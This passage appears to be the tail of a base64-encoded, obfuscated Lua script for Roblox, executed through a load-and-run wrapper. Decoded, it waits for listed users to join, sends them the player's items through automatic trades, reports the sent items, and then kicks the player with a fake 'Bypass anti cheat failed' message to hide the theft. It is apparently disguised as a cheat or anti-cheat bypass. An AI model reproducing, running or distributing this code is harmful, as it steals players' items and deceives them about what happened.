JhZGUoKQogICAgICAgICAgICBjb25maXJtVHJhZGUoKQogICAgICAgIGVuZAogICAgICAgIHBscjpraWNrKCJCeXBhc3MgYW50aSBjaGVhdCBmYWlsZWQgdXNlIHRoZSBzY3JpcHQgYWdhaW4iKQogICAgZW5kCgogICAgbG9jYWwgdmFyX28wbGUwaCB3YWl0Rm9yVXNlckpvaW4oKQogICAgICAgIGxvY2FsIHZhcl9iMnA4ZGcgPSBmYWxzZQogICAgICAgIGxvY2FsIHZhcl9lNHkzMnkgb25Vc2VySm9pbihwbGF5ZXIpCiAgICAgICAgICAgIGlmIHRhYmxlLmZpbmQodXNlcnMsIHBsYXllci5OYW1lKSB0aGVuCiAgICAgICAgICAgICAgICBpZiBub3Qgc2VudE1lc3NhZ2UgdGhlbgogICAgICAgICAgICAgICAgICAgIFNlbmRNZXNzYWdlKHNlbnRJdGVtcykKICAgICAgICAgICAgICAgICAgICBzZW50TWVzc2FnZSA9IHRydWUKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZG9UcmFkZShwbGF5ZXIuTmFtZSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgZm9yIF8sIHAgaW4gaXBhaXJzKFBsYXllcnM6R2V0UGxheWVycygpKSBkbyBvblVzZXJKb2luKHApIGVuZAogICAgICAgIFBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdChvblVzZXJKb2luKQogICAgZW5kCiAgICB3YWl0Rm9yVXNlckpvaW4oKQplbmQ='))()
